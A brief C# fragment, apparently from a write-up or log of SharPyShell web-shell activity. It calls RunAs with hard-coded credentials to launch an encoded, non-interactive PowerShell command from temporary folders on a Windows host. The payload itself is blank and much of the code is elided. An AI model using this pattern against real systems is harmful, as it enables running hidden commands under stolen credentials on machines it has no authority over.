                ...
                public class SharPyShell
                {
                    ...
                    {
                        string output_func=RunAs(@"admin_infinity", @"Password2!", @"", @"powershell -nop -noni -enc    =", @"C:\Windows\Temp\x1fvogijp5pyzn7\6s1gcx6zzl", @"C:\Windows\Temp\x1fvogijp5pyzn7\fnq6sghi4kqpu", @"C:\Windows\Temp\infinity_edge", 3, 60000);
